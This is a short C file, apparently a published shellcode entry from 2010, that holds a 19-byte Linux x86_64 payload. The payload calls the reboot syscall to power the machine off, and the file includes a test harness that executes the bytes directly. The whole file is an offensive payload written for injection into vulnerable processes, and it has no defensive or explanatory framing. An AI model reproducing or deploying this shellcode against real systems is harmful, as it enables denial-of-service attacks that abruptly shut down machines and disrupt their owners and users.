/*
# Linux/x86_64 reboot(POWER_OFF) 19 bytes shellcode
# Date: 2010-04-25
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux
*/

/*
    ; reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
LINUX_REBOOT_CMD_POWER_OFF)

    section .text
        global _start

    _start:
        mov     edx, 0x4321fedc
        mov     esi, 0x28121969
        mov     edi, 0xfee1dead
        mov     al,  0xa9
        syscall
*/
int main(void)
{
    char reboot[] =
    "\xba\xdc\xfe\x21\x43"  // mov    $0x4321fedc,%edx
    "\xbe\x69\x19\x12\x28"  // mov    $0x28121969,%esi
    "\xbf\xad\xde\xe1\xfe"  // mov    $0xfee1dead,%edi
    "\xb0\xa9"              // mov    $0xa9,%al
    "\x0f\x05";             // syscall

    (*(void (*)()) reboot)();

    return 0;
}